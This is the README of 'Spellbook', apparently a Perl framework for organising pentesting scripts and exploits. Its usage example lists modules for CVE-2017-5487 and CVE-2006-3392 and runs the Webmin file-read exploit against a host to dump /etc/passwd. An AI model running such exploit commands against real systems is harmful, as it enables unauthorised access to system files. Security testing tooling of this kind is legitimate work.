<p align="center">
  <img src="https://heitorgouvea.me/images/projects/spellbook/logo.png" width="120px" height="120px">
  <h3 align="center"><b>Spellbook</b></h3>
  <p align="center">A micro-framework for rapid development of reusable security tools</p>
  <p align="center">
    <a href="https://github.com/htrgouvea/spellbook/blob/master/LICENSE.md">
      <img src="https://img.shields.io/badge/license-MIT-blue.svg">
    </a>
    <a href="https://github.com/htrgouvea/spellbook/releases">
      <img src="https://img.shields.io/badge/version-0.1.0-blue.svg">
    </a>
  </p>
</p>

---

### Summary

Spellbook uses FBP: "In computer programming, flow-based programming (FBP) is a programming paradigm that defines applications as networks of "black box" processes, which exchange data across predefined connections by message passing, where the connections are specified externally to the processes. These black box processes can be reconnected endlessly to form different applications without having to be changed internally. FBP is thus naturally component-oriented." [[1]](#references)

The main focus of this “micro-framework” is to keep my personal scripts organized and make them available in a structure where I can reuse the code that has already been written to write something else. Here you will find my “spellbook”: scripts, exploits and other small things I wrote during my bug hunting jorney, pentesting or red teaming missions.

---

### Download and install

```bash
# Download
$ git clone https://github.com/htrgouvea/spellbook && cd spellbook

# Install libs and dependencies
$ cpan install Getopt::Long Mojo::File Mojo::JSON
```

---

### How to use

```
Spellbook v0.1.0
Core Commands
==============
	Command          Description
	-------          -----------
	-s, --search     List modules, you can filter by category
	-m, --module     Set a module to use
	-t, --target     Set a target
	-p, --parameter  Set a value for a module parameter
```

### Example

```bash
# Searching for exploits 
$ perl spellbook.pl --search exploits

Module: Exploits::CVE_2017_5487
Description: Read usernames leaked on WordPress API
=================================================

Module: Exploits::CVE_2006_3392
Description: Read arbitrary files for servers running Webmin before 1.290 and Usermin before 1.220
=================================================
...

# Using an exploit
$ perl spellbook.pl -m Exploits::CVE_2006_3392 -t http://172.30.0.15:10000/ -p /etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
...
```

If you are interested in developing new modules, a good start is to read the [development guide](/wiki/Developer-Guide).

---

### Contribution

- Your contributions and suggestions are heartily ♥ welcome. [See here the contribution guidelines.](/.github/CONTRIBUTING.md) Please, report bugs via [issues page](https://github.com/htrgouvea/spellbook/issues) and for security issues, see here the [security policy.](/SECURITY.md) (✿ ◕‿◕) This project follows the best practices defined by this [style guide](https://heitorgouvea.me/projects/perl-style-guide).

---

### License

- This work is licensed under [MIT License.](/LICENSE.md)

---

### References

1. [https://en.wikipedia.org/wiki/Flow-based_programming](https://en.wikipedia.org/wiki/Flow-based_programming)